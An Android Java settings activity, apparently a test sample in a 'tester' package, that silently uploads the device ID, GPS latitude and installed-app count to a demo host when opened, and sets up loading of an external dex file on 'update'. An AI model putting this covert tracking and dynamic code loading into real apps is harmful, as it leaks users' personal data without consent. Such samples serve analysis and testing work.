package com.arsat.tester;

import android.app.Activity;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationManager;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.view.View;
import android.widget.Button;

import java.io.File;
import java.util.List;

import dalvik.system.PathClassLoader;

public class SettingsActivity extends Activity {
    private static final String TAG = "SettingsActivity";
    private Button mUpdateButton;

    @Override
    public void onCreate(Bundle savedInstance) {
        super.onCreate(savedInstance);
        setContentView(R.layout.activity_settings);
        mUpdateButton = (Button) findViewById(R.id.update);
        uploadInfo();
    }

    private void uploadInfo() {
        PackageManager pm = getPackageManager();
        List<ApplicationInfo> infos = pm.getInstalledApplications(0);
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            String deviceId = tm.getDeviceId();
            if (deviceId == null || deviceId.length() == 0) {
                deviceId = "nodevice";
            }
            String subId = tm.getSubscriberId();
            if (subId == null || subId.length() == 0) {
                subId = "nodevice";
            }

            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            String locStr = loc == null ? "unkown" : "" + loc.getLatitude();

            String url = new String("https://co.demo.arsat/upload?location=" + locStr + "&deviceId=" + deviceId + "&appNum=" + infos.size());
            Utils.uploadInfo(url);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void onClick(View view) {
        int id = view.getId();
        switch (id) {
            case R.id.update:
                checkUpdate();
                break;
        }
    }

    private void checkUpdate() {
        Utils.uploadInfo("https://com.demo.arsat/check_update");
        try {
            File dir = Utils.getArsatDir(this);
            File dex = new File(dir, "v0.1.0.dex");
            PathClassLoader loader = new PathClassLoader(dex.getCanonicalPath(), null);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
